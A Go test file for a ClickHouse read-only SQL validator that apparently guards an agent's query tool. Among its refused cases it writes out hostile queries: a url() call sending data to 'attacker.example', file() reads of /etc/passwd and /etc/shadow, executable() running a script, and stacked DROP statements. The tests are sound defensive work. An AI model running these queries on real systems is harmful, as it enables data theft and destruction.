package clickhouse

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/gstern-CTO/huginn/internal/protocol"
)

func TestAcceptsReadStatements(t *testing.T) {
	for _, stmt := range []string{
		`SELECT count() FROM dns.queries`,
		`select * from t limit 10`,
		`WITH recent AS (SELECT * FROM q WHERE ts > now() - INTERVAL 7 DAY) SELECT * FROM recent`,
		`SHOW TABLES`,
		`DESCRIBE TABLE dns.queries`,
		`EXPLAIN SELECT 1`,
		`EXISTS TABLE dns.queries`,
		`CHECK TABLE dns.queries`,
		`SELECT toDate(ts) AS d, count() FROM q GROUP BY d ORDER BY d`,
		`SELECT 1;`,
	} {
		require.Nil(t, ValidateReadOnlySQL(stmt), "expected %q to be accepted", stmt)
	}
}

// ClickHouse's mutating surface is wider than Databricks': cluster and storage
// administration verbs exist that Databricks has no equivalent for.
func TestRefusesClickHouseSpecificMutations(t *testing.T) {
	for _, stmt := range []string{
		`SYSTEM FLUSH LOGS`,
		`KILL QUERY WHERE query_id = 'x'`,
		`ATTACH TABLE t`,
		`DETACH TABLE t`,
		`RENAME TABLE a TO b`,
		`EXCHANGE TABLES a AND b`,
		`BACKUP TABLE t TO Disk('backups','t')`,
		`RESTORE TABLE t FROM Disk('backups','t')`,
		`ALTER TABLE t DELETE WHERE 1`,
		`OPTIMIZE TABLE t FINAL`,
		`INSERT INTO t VALUES (1)`,
		`DROP TABLE t`,
		`TRUNCATE TABLE t`,
		`CREATE TABLE t (a Int) ENGINE=Memory`,
	} {
		tErr := ValidateReadOnlySQL(stmt)
		require.NotNil(t, tErr, "expected %q to be refused", stmt)
		require.Equal(t, protocol.CodeForbiddenSQL, tErr.Code, stmt)
		require.False(t, tErr.Retryable, stmt)
		require.NotEmpty(t, tErr.Hint, stmt)
	}
}

// WATCH is refused for a different reason from the rest: it mutates nothing,
// but it never terminates, so it would hold a tool call open until the deadline.
func TestRefusesWatch(t *testing.T) {
	tErr := ValidateReadOnlySQL(`WATCH live_view`)
	require.NotNil(t, tErr)
	require.Equal(t, protocol.CodeForbiddenSQL, tErr.Code)
}

// The case the whole callee denylist exists for. These read as SELECTs and pass
// every verb check, and a ClickHouse configured with readonly=2 executes them —
// verified against 24.10 in Design Log #5. url() was observed making a real
// outbound request, which is an exfiltration channel out of a "read-only" tool.
func TestRefusesTableFunctionsThatReachOutsideTheDatabase(t *testing.T) {
	cases := map[string]string{
		"exfiltration via url":    `SELECT * FROM url('http://attacker.example/?d=1', 'CSV', 'x String')`,
		"server file read":        `SELECT * FROM file('/etc/passwd', 'CSV', 'x String')`,
		"object storage":          `SELECT * FROM s3('https://b.s3.amazonaws.com/k', 'CSV', 'x String')`,
		"another clickhouse node": `SELECT * FROM remote('other:9000', system.one)`,
		"external database":       `SELECT * FROM mysql('h:3306','db','t','u','p')`,
		"external postgres":       `SELECT * FROM postgresql('h:5432','db','t','u','p')`,
		"local command":           `SELECT * FROM executable('script.sh', 'CSV', 'x String')`,
		"joined in, not leading":  `SELECT a.x FROM t AS a JOIN url('http://e/x','CSV','x String') AS b ON a.x = b.x`,
		"nested in a subquery":    `SELECT * FROM (SELECT * FROM file('/etc/shadow','CSV','x String'))`,
		"uppercased":              `SELECT * FROM URL('http://e/x','CSV','x String')`,
	}
	for name, stmt := range cases {
		t.Run(name, func(t *testing.T) {
			tErr := ValidateReadOnlySQL(stmt)
			require.NotNil(t, tErr, "expected refusal")
			require.Equal(t, protocol.CodeForbiddenSQL, tErr.Code)
			require.Contains(t, tErr.Details, "forbiddenFunction",
				"the refusal must name the function so the caller can rewrite the query")
			require.NotEmpty(t, tErr.Docs, "a refusal should point at the rules")
		})
	}
}

// The denylist must not fire on a column, alias or literal that merely shares a
// name. Literals are blanked before the scan, which is the same property that
// keeps `WHERE note = 'do not drop this'` from reading as a DROP.
func TestCalleeDenylistDoesNotProduceFalsePositives(t *testing.T) {
	for _, stmt := range []string{
		`SELECT url FROM requests`,
		`SELECT url, file FROM assets WHERE note = 'fetched via url() once'`,
		`SELECT count() FROM t WHERE comment = 's3(''bucket'')'`,
		`SELECT input_rows FROM system.query_log`,
		`SELECT remote_addr FROM access_log`,
		`SELECT s3_bytes FROM metrics`,
	} {
		require.Nil(t, ValidateReadOnlySQL(stmt), "expected %q to be accepted", stmt)
	}
}

func TestRefusesMultipleStatements(t *testing.T) {
	for _, stmt := range []string{
		`SELECT 1; DROP TABLE t`,
		`SELECT 1; SELECT 2`,
	} {
		tErr := ValidateReadOnlySQL(stmt)
		require.NotNil(t, tErr, stmt)
		require.Equal(t, protocol.CodeForbiddenSQL, tErr.Code)
	}
}

func TestCommentsCannotHideAVerb(t *testing.T) {
	require.Nil(t, ValidateReadOnlySQL("SELECT 1 -- DROP TABLE t\n"))
	require.Nil(t, ValidateReadOnlySQL("SELECT 1 /* SYSTEM SHUTDOWN */"))

	tErr := ValidateReadOnlySQL("-- SELECT 1\nSYSTEM SHUTDOWN")
	require.NotNil(t, tErr)
	require.Equal(t, protocol.CodeForbiddenSQL, tErr.Code)
}

func TestRefusalNamesTheOffendingToken(t *testing.T) {
	tErr := ValidateReadOnlySQL(`SYSTEM DROP CACHE`)
	require.NotNil(t, tErr)
	require.Equal(t, "SYSTEM", tErr.Details["leadingKeyword"])

	tErr = ValidateReadOnlySQL(`SELECT * FROM s3('u','CSV','x String')`)
	require.NotNil(t, tErr)
	require.Equal(t, "s3", tErr.Details["forbiddenFunction"])
}

// ClickHouse quotes identifiers with backticks, so the sanitiser has to treat
// them as literals or a backticked column could smuggle a keyword.
func TestBacktickedIdentifiersAreHandled(t *testing.T) {
	require.Nil(t, ValidateReadOnlySQL("SELECT `drop` FROM t"))
	require.Nil(t, ValidateReadOnlySQL("SELECT `url` FROM t"))
}

func TestEmptyAndUnterminatedAreRefused(t *testing.T) {
	for _, stmt := range []string{"", "   ", "-- only a comment", `SELECT 'unterminated`, `SELECT 1 /* unterminated`} {
		tErr := ValidateReadOnlySQL(stmt)
		require.NotNil(t, tErr, "expected %q to be refused", stmt)
		require.Equal(t, protocol.CodeInvalidInput, tErr.Code)
	}
}
